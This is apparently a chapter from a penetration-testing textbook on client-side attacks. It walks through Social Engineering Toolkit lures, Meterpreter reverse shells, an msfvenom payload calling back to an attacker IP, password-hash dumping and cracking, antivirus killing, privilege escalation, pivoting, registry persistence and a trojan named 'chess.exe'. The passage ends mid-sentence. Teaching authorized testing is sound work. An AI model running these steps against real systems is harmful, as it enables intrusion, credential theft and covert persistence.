- en: Chapter 12. Exploring Client-side Attack Vectors
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this chapter, we will identify the methods we use to attack clients. Unlike
    our servers, the client does not provide services; therefore, it is not a simple
    task to get the client to wait for us to attack it. Instead, we will use techniques
    to get the client to come to us. In this chapter, we will discuss the following
    topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Client-side attack methods
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Pilfering data from the client
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Using the client as a pivot point
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Client-side exploitation
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Binary payloads
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Malicious PDF files
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Bypassing antivirus and other protection tools
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Obfuscation and encoding
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: This chapter will provide us with information about the ways we can target clients.
    We will explore the different methods of attacking a client. We will also explore
    how this is currently the main attack vector that we will present after the testing
    we do today. We have the advantage of knowing that the client is going to click
    on a link or a file in most cases. It is this action that will provide us with
    the vector to attack the client.
  prefs: []
  type: TYPE_NORMAL
- en: Client-side attack methods
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As we have already said, when it comes to a client, they do not just sit and
    wait for a connection from us; therefore, we have to trick them and get them to
    come to us. We have a number of ways to do this, and we will talk about two of
    them now.
  prefs: []
  type: TYPE_NORMAL
- en: Bait
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: When we deploy the bait technique, we set some form of bait and wait for a client
    to come and take the bait. This is a similar approach to fishing, that is, we
    try to put some type of bait out and entice a client to come to us. The problem
    with this approach is the same as the problem with fishing. We do not know whether
    the client will ever come to where we have the bait.
  prefs: []
  type: TYPE_NORMAL
- en: Lure
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Using the lure concept, we are still trying to trick the client to come to us,
    but we don't just wait for them to come and take some form of bait. Instead, we
    send the client some form of communication and wait to see whether they are tricked
    into following our hook. We have three main methods in this scenario, and they
    are e-mail, web, and USB media. This is also the approach used in phishing and
    spear phishing. In each of these methods, we send an e-mail to a potential victim
    and see whether they will click on the link that we have sent them. If they do
    click on the link, we have them come to us or run an application on their systems
    and use that to mount our attack. Since we are working on our virtual pen testing
    environments, we can control the client side of the attack. So, it is a matter
    of experimenting on our range to see what works and what does not work. If we
    are allowed client-side testing in our scope of work, we can attempt to send phishing
    e-mails and other methods of social engineering to see whether we can trick an
    employee into falling in our trap.
  prefs: []
  type: TYPE_NORMAL
- en: This is best shown with an example so we will do that now. We need the Kali
    Linux machine and a victim machine. For the example in this book, we will use
    a Windows 7 machine as the victim machine. The tool we will use is the Social
    Engineering Toolkit that was developed by Dave Kennedy; you can download it from
    [http://www.trustedsec.com](http://www.trustedsec.com). This is an exceptional
    tool that helps with client-side attacks. We will explore a Java attack vector
    for our first example.
  prefs: []
  type: TYPE_NORMAL
- en: 'Once the machines are up and running, we will open a terminal window and enter
    `setoolkit` to start the Social Engineering Toolkit. Accept the terms of service
    and enter `y` to move on to the next prompt. An example of the menu is shown in
    the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_1.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'The Social Engineering Toolkit has a number of menus that you have to work
    through, and we will do that now. We will use the **Social-Engineering Attacks**
    menu, so enter the number `1` as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_56.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'In the next window, select **Website Attack Vectors** by entering number `2`,
    as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_57.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'In the next window, select **Java Applet Attack Method** by entering number
    `1`, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_58.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We will use a template, so enter number `1`. Enter `no` since we are not using
    port forwarding. Enter the IP address of the Kali machine for the connection back
    from the victim, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_59.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'In the template options, enter number `1` to select **Java Required**, as shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_60.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We will enter option number `2` to select the Meterpreter reverse shell payload,
    as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_61.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'In the encoding option, select option number `4` for **Backdoored Executable**.
    Accept the default listener port of 443\. After a few moments, you should see
    a completion message. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_62.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Once the process is complete, the metasploit program will run and enter the
    configuration for the reverse shell. Once this process is complete, you should
    see a result similar to the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_2.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Screen displayed once the process is complete (the cropped text is not important)
  prefs: []
  type: TYPE_NORMAL
- en: 'As the previous screenshot shows, we now have the exploit running as a background
    job, so all we have to do is get the client to click on a link that references
    the IP address that we set up on the exploit. For our testing purposes, we will
    just open a browser on the Windows 7 machine and enter the IP address of the Kali
    machine. When you connect to the server with the browser, a dialog box pop-up
    referencing Java appears. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_3.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Our intention here is to get the victim to click on the **Run** button, so
    we will do that now. As soon as we click on the button, another window may pop
    up. We should not have to click on it more than twice. When we return to our Kali
    machine, we should see a session open. An example of this is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Lure](img/477-1_12_4.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We now have a session on the machine and it is just a matter of what we want
    to do from here. We will look at this next.
  prefs: []
  type: TYPE_NORMAL
- en: Pilfering data from the client
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Once we have the shell of the machine, we will pilfer information from it.
    First, we will check what privilege level we are at. We want to be at the system
    privilege level so that we can access the data without problem. We need to interact
    with our shell, so press *Enter* in the Kali window and enter `sessions –i 1`
    to access the session. Once you are in the session, enter `getuid`. An example
    of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_5.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we are not at the system privilege level,
    so we want to fix that now. Enter `ps` to display the running processes on the
    victim machine. We will find a process that runs at the system privilege level.
    A sample of the victim machine of our example is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_6.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we have several processes to choose from.
    We will attempt to migrate the process `Mcshield.exe`. To do this, we enter `migrate
    1960` and wait to see whether our process is successful. If we are successful,
    then we move on and enter `getuid` again. If we are not successful, we try another
    process. It seems like a good process to hide in the on-demand antivirus scanner.
    An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_7.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, we have escalated privileges and officially
    own this system now. So, we have the freedom to pilfer information without needing
    a higher privilege level.
  prefs: []
  type: TYPE_NORMAL
- en: 'There are a number of tools in the Meterpreter shell that we can use to pilfer
    additional information. The first we will explore is the scraper tool. As the
    name suggests, we use this tool to scrape information from the exploited machine.
    An example of the tool being used is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_8.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'The scraper tool extracts a wealth of information from the compromised machine.
    This is why it takes quite a bit of time to extract the information and the tool
    to finish. The tool also extracts the password hashes from the machine. We can
    extract this information using the `hashdump` command. An example of this is shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_9.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We can save the hashes to a file, and then run them through the password cracking
    tool **John the Ripper** or any online site such as [http://www.md5decrypter.co.uk](http://www.md5decrypter.co.uk).
    Once we save the hashes to the file `hash.txt`, we open a terminal window and
    enter `john hash.txt --show`. This will start the password cracking process. An
    example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_10.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Screen showing the password cracking process (the cropped text is not important)
  prefs: []
  type: TYPE_NORMAL
- en: 'We can also use the tool **winenum** to concentrate on the fact that the machine
    is a Windows machine. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'All of this information is saved in the directory `/root/.msf4/logs/scripts`.
    Within this directory, you will see additional directories named for the tool
    that was used. An example of the files that are found after the winenum tool has
    been used is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_12.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we have now pilfered a significant amount
    of information from the compromised machine. An example of the information pilfered
    from the `netstat__vb.txt` file is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_13.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'In the previous screenshot, you can see the connections on the machine. This
    includes the two connections that are from our Kali machine. As you can see, we
    use the port 443\. There are several reasons for this. Some of them are: it will
    look like normal traffic in the network logs and that we will encrypt the information
    so that the monitoring on the machines is blind. An example of the session that
    we used is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pilfering data from the client](img/477-1_12_14.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The previous screenshot shows that while we pilfer the information, there is
    no indication of what we actually do. This makes it very difficult to determine
    what takes place within the session.
  prefs: []
  type: TYPE_NORMAL
- en: Using the client as a pivot point
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: When we compromise a machine, the next thing we want to do is use the client
    source to our advantage. This is because we know most networks are configured
    with the locations that are inside the network architecture being considered at
    a higher level of trust and not with a location that is outside the network. We
    refer to this as pivoting.
  prefs: []
  type: TYPE_NORMAL
- en: Pivoting
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'To set our potential pivot point, we first need to exploit a machine. Then
    we need to check for a second network card in the machine that is connected to
    another network, which we cannot reach without using the machine that we exploit.
    As an example in this book, we will use three machines with the Kali Linux machine
    as the attacker, a Windows XP machine as the first victim, and a Windows Server
    2003 machine the second victim. The scenario is that we get a client to go to
    our malicious site, and we use an exploit called *Use after free* against Microsoft
    Internet Explorer. This type of exploit has continued to plague the product for
    a number of revisions. An example of this is shown in the following screenshot
    from the Exploit DB website:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting](img/477-1_12_15.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The exploit listed at the top of the list is one that is against Internet Explorer
    9\. As an example in the book, we will target the exploit that is against Internet
    Explorer 8; the concept of the attack is the same. In simple terms, Internet Explorer
    developers continue to make the mistake of not cleaning up memory after it is
    allocated.
  prefs: []
  type: TYPE_NORMAL
- en: 'Start up your metasploit tool by entering `msfconsole`. Once the console has
    come up, enter `search cve-2013-1347` to search for the exploit. An example of
    the results of the search is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting](img/477-1_12_16.jpg)'
  prefs: []
  type: TYPE_IMG
- en: One concern is that it is rated as good, but we like to find ratings of excellent
    or better when we select our exploits. For our purposes, we will see whether we
    can make it work. Of course, there is always a chance we will not find what we
    need and have to make the choice to either write our own exploit or document it
    and move on with the testing.
  prefs: []
  type: TYPE_NORMAL
- en: 'For the example we use here in the book, the Kali machine is 192.168.177.170,
    and it is what we set our `LHOST` to. For your purposes, you will have to use
    the Kali address that you have. We will enter the following commands in the metasploit
    window:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'An example of the results of the preceding command is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting](img/477-1_12_17.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we now have the URL that we need to get the
    user to access. For our purposes, we will just copy and paste it in Internet Explorer
    8, which is running on the Windows XP Service Pack 3 machine. Once we have pasted
    it, we may need to refresh the browser a couple of times to get the payload to
    work; however, in real life, we get just one chance, so select your exploits carefully
    so that one click by the victim does the intended work. Hence, to be a successful
    tester, a lot of practice and knowledge about the various exploits is of the utmost
    importance. An example of what you should see once the exploit is complete and
    your session is created is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting](img/477-1_12_18.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Screen showing an example of what you should see once the exploit is complete
    and your session is created (the cropped text is not important)
  prefs: []
  type: TYPE_NORMAL
- en: 'We now have a shell on the machine, and we want to check whether it is dual-homed.
    In the Meterpreter shell, enter `ipconfig` to see whether the machine you have
    exploited has a second network card. An example of the machine we exploited in
    the book is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting](img/477-1_12_19.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we are in luck. We have a second network
    card connected and another network for us to explore, so let us do that now. The
    first thing we have to do is set the shell up to route to our newly found network.
    This is another reason why we chose the Meterpreter shell, it provides us with
    the capability to set the route up. In the shell, enter `run autoroute –s 10.2.0.0/24`
    to set a route up to our 10 network. Once the command is complete, we will view
    our routing table and enter `run autoroute –p` to display the routing table. An
    example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting](img/477-1_12_20.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we now have a route to our 10 network via
    session 1\. So, now it is time to see what is on our 10 network. Next, we will
    add a background to our session 1; press the *Ctrl* + *z* to background the session.
    We will use the scan capability from within our metasploit tool. Enter the following
    commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: The port scanner is not very efficient, and the scan will take some time to
    complete. You can elect to use the Nmap scanner directly in metasploit. Enter
    `nmap –sP 10.2.0.0/24`. Once you have identified the live systems, conduct the
    scanning methodology against the targets. For our example here, we have our target
    located at `10.2.0.149`.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the results for this scan is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting](img/477-1_12_21.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We now have a target, and we could use a number of methods we covered earlier
    against it. For our purposes here, we will see whether we can exploit the target
    using the famous MS08-067 Service Server buffer overflow. In the metasploit window,
    set the session in the background and enter the following commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'If all goes well, you should see a shell open on the machine. When it does,
    enter `ipconfig` to view the network configuration on the machine. From here,
    it is just a matter of carrying out the process that we followed before, and if
    you find another dual-homed machine, then you can make another pivot and continue.
    An example of the results is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting](img/477-1_12_22.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, the pivot was successful, and we now have
    another session open within metasploit. This is reflected with the **Local Pipe**
    | **Remote Pipe** reference. Once you complete reviewing the information, enter
    `sessions` to display the information for the sessions. An example of this result
    is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Pivoting](img/477-1_12_23.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Proxy exploitation
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In this section, we will look at the capability of the metasploit tool to use
    both HTTP and HTTPS for communication. One of the defenses that are often deployed
    against us is the concept of egress or outbound traffic. Now, it is common to
    see that sites only allow outbound HTTP and HTTPS traffic; therefore, the developers
    of metasploit have created modules for this.
  prefs: []
  type: TYPE_NORMAL
- en: Leveraging the client configuration
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: When we use techniques to leverage the communication out to our attacker machine,
    we will read the client configuration and then send the traffic out via the proxy
    that is configured there. Traditionally, this was a difficult process and took
    quite a bit of time to set up. Consequently, the amount of time and the communication
    requirements increased the chance of either getting detected or the session timing
    out. Fortunately, there are additional options that we can explore to assist us
    with this. The developers of metasploit have created two stagers that allow us
    to leverage the client configuration, and they have native support for both HTTP
    and HTTPS communication within the Meterpreter shell. Furthermore, these stagers
    provide the capability to set a number of different options that allow for the
    reconnection of shells over a specified period of time by providing the capability
    to set an expiration date for the session.
  prefs: []
  type: TYPE_NORMAL
- en: 'The two stagers are **reverse_http** and **reverse_https**. These two stagers
    are unique in that they are not tied to a specific TCP session, that is, they
    provide a packet-based transaction method, whereas the other options are stream-based.
    This allows for a more robust set of options for the attack. Moreover, we are
    provided with three options to assist us determine when the user is done, which
    are as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Expiration date: The default is one week'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Time to Live** (**TTL**): The default is 5 minutes'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Exposed API core: Using the detach command to exit but not to terminate the
    session'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: These parameters allow us to disconnect from the session and automatically reconnect
    later. They also allow us to set the payload as a persistent listener and then
    connect to it even if the target reboots or is shut down. We will explore this
    now.
  prefs: []
  type: TYPE_NORMAL
- en: 'We will use a malicious executable for this example. We can use a number of
    different vectors such as web, e-mail, or USB, but for the sake of the easier
    option, we will use the malicious executable. Furthermore, we will use a special
    tool to create the payload. If you do not have metasploit running, enter `msfconsole`
    to start the tool. Once the tool has started, enter `msfvenom -p windows/meterpreter/reverse_https
    -f exe LHOST=192.168.177.170 LPORT=4443 > https.exe` to create the executable
    file named `https.exe`. An example of the output from the command is shown in
    the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Leveraging the client configuration](img/477-1_12_24.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Now we will set up the handler. Enter the following in metasploit:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'An example of the commands, once completed, is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Leveraging the client configuration](img/477-1_12_25.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We are now ready to have the victim run our executable. After we move the executable
    to the victim machine, double-click on the file, return to the metasploit handler,
    and observe the results. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Leveraging the client configuration](img/477-1_12_26.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'From here, it is a matter of what we want to do. Enter a few commands that
    we used previously in the Meterpreter shell. The added bonus here is the fact
    that we have all the communication egressing out to port 4443, and this will look
    exactly like normal traffic. In Kali, start a capture on Wireshark and observe
    the communications between the machines. An example of this is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Leveraging the client configuration](img/477-1_12_27.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Again, if we want to change the port to SSH, HTTPS, or any port that we thought
    could get out of the environment we are testing, we are free to do this. For an
    example of how powerful the capability is, continue to have the client connect
    with you. In the Meterpreter shell, enter `detach` to exit the session; as soon
    as you exit, the victim will connect back to you.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Leveraging the client configuration](img/477-1_12_28.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'The next thing we will attempt to do is set the victim up by copying the code
    to the registry so that the attack will survive even a reboot. In the Meterpreter
    shell, enter the following commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'An example of the result of using these commands is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Leveraging the client configuration](img/477-1_12_29.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'With these commands, we first enumerated the registry, and then set the key
    to reference the program at startup. As the third command shows, the `evil` program
    is now located in the registry key. Of course, if we were trying to hide it, we
    would name it something else. We can verify that the program has been planted
    by accessing the Windows XP machine and navigating to **Start** | **Run** | **regedit**
    and searching for the program. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Leveraging the client configuration](img/477-1_12_31.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We now want to reboot the victim machine. After the reboot, an example of the
    results of the connection returning in the metasploit window is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Leveraging the client configuration](img/477-1_12_30.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Client-side exploitation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Thus far, most of what we have covered has been a form of client exploitation.
    In this section, we will look at more methods of attacking a client. We will continue
    to exploit the machine using the vector of a client, clicking on a link or file
    and being directed to our attacker machine. Before we continue, we want to reiterate
    that at the time of writing this book, we used the latest and greatest attacks
    that were available. By the time you read this book, some things will have changed.
    However, the one thing that will remain constant is the process and methodology.
    As long as you continue to follow the systematic process, you will be able to
    uncover and identify the latest techniques and modify your approach accordingly.
  prefs: []
  type: TYPE_NORMAL
- en: One of the challenges of the previous methods we used in the chapter is that
    we had to select a particular exploit based on the version of the software we
    encountered. We did this with Java and Internet Explorer. This worked well, but
    what if we do not know what exactly the victim is going to have on their system
    when they connect to us? As you may imagine, this is a legitimate concern. Fortunately
    for us, it has been addressed by the exceptional developers at metasploit. Consequently,
    they have provided us a module that will try to serve up a variety of exploits
    once the connection is made. That module is `browser_autopwn`. This powerful module
    does sets up a web server with all of the current exploits in the inventory, and
    when a connection is made, the module runs through the available exploits until
    it finds one. Remember, as it can never be ignored, exploitation is not 100 percent,
    so there is a chance that it will fail. But as testers, we have to always make
    the attempt and maintain the practice of documenting the findings and move on
    with our testing.
  prefs: []
  type: TYPE_NORMAL
- en: 'So, let''s get started. In the metasploit interface, enter the following commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'The `URIPATH` setting tells metasploit not to generate a random URL. We want
    the client to just connect to the address of the server running on the Kali machine.
    An example of these settings is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_32.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'You will notice that once you have entered the `run` command, the tool will
    start creating a number of components to support our exploits. This will take
    some time to complete. An example of some of the output of the different components
    being created for the exploits is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_33.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'At the time of writing this book, we had 19 exploits that were created as part
    of the preparation for a connection from a victim. An example of this is shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_34.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We did not comment on it previously, but as soon as a shell is received, you
    will notice that a migration process takes place. This is because the browsers
    are not very stable when you attempt the exploits. So, once you gain access, it
    is important to migrate the exploit. If the browser crashes or is closed by the
    user, it has little impact on your session.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the results when a client connects is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_35.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As a reminder, the module will continue to fire exploits and try to get a session,
    but there are no guarantees that it will. Some of you reading this may wonder
    what happens if another machine connects to our server. For an example of this
    using Firefox as the browser, refer to the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_36.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'From this point, all you can do is wait and see whether you get lucky and one
    of the exploits is successful. If all goes well, you will eventually see a session
    open. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_37.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Now that we have a shell, we can perform any number of things we covered earlier
    in the book. There is one we have not covered until this point, and we will do
    it now. Start interacting with the Meterpreter shell with the sessions command.
    Once you are in the shell, enter `run getcountermeasure` to see what types of
    protections are on the client. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_38.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We see that we have a potential antivirus program on the machine, and we also
    see that we have the firewall on. The first thing we want to do is attempt to
    kill the antivirus program. Enter `run killav` to attempt to kill the running
    antivirus program. An example of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_39.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we are not successful, and this is because
    we are not at the privilege level we need to be. We can try to migrate to a process
    to escalate our privileges, but this means we have to do extra work to determine
    what process to migrate to, and we may not be successful. So, let''s try another
    method. As we continue to state, we have the methodology; the tools will come
    with time and a lot of practice. In the Meterpreter shell, enter `getsystem` to
    let the tool try a number of techniques to escalate privileges. An example of
    this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_40.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, we now have system, and as such, could turn
    off the protection that we detected earlier. Moreover, we can do pretty much anything
    we want on this system since the privilege has been escalated. We will leave that
    as a homework exercise for those of you who want to explore further.
  prefs: []
  type: TYPE_NORMAL
- en: We will look at one more thing here in this section, and that is the ability
    to bypass the **User Account Control** (**UAC**) on a machine. As we discovered
    earlier, there is no guarantee that we will be successful, but we can at least
    attempt it. In the metasploit tool, if you no longer have sessions active, exploit
    the machine using any of the variety of methods we covered and determine what
    privilege level the session is at. Once you have done this, set the session in
    the background and search for an exploit. We have covered the steps for all of
    this so we will not cover them again here. Once you are ready to search, enter
    `search uac` and search for a UAC bypass.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the results from the search is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_41.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'As the previous screenshot shows, we have a number of different techniques
    available, but a concern is that there is nothing newer than 2012, so our success
    in exploiting this may be limited. We can always try, and since we have three
    techniques rated as excellent, we will use them. One thing they all have in common
    is that a session must be started to attempt the bypass. We will start at the
    bottom and work our way up. An example of the results is shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Client-side exploitation](img/477-1_12_42.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, we are successful with the first attempt,
    and from this point, we can proceed with post-exploitation techniques were covered
    previously. Remember to stay within the requirements as detailed in our scope
    of work.
  prefs: []
  type: TYPE_NORMAL
- en: Binary payloads
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In the metasploit tool, we have the capability to generate our own binary payloads,
    and this is what we will look at in this section. To see the options for this,
    start the metasploit tool and enter `msfpayload windows/shell_reverse_tcp O`.
    The `O` at the end will display the options that can be set for our payload. Since
    we are setting a reverse shell, you probably have a good idea of the options for
    this. An example of the output from this command is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Binary payloads](img/477-1_12_43.jpg)'
  prefs: []
  type: TYPE_IMG
- en: As the previous screenshot shows, we have default settings that are based on
    our local machine address for the Kali machine. Therefore, we really do not require
    any changes unless we want to define a specific `LPORT` to egress a firewall.
    So, for our purposes, we will leave the settings as they are. Enter `msfpayload
    LPORT=4443 X > /tmp/chess.exe`. Once the file is created, we will view the details
    of the file. In the window, enter `file /tmp/chess.exe`.
  prefs: []
  type: TYPE_NORMAL
- en: 'An example of the output of these commands is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Binary payloads](img/477-1_12_44.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We are now ready for the next step, which is to get the file onto the victim
    machine so they can execute it. This is why we selected the name of `chess`; it
    appears that we have a game for them to play. Before we transfer the file to the
    machine, we have to set up the metasploit tool to receive the connection. In the
    metasploit window, enter the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'An example of the results of this is shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Binary payloads](img/477-1_12_45.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We are now set for the victim to connect. As we did throughout the chapter,
    we copy the file to the victim machine and then execute it. Since we've explained
    this a number of times, we will move on to the next item.
  prefs: []
  type: TYPE_NORMAL
- en: Malicious PDF files
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Another popular vector of attack is that of using common files to host our
    exploit code, and that is what we do with the malicious PDF files. We will create
    a payload in a PDF file; when the victim runs it using a vulnerable version of
    Adobe Reader, we gain access to the machine. This vector has been used many times
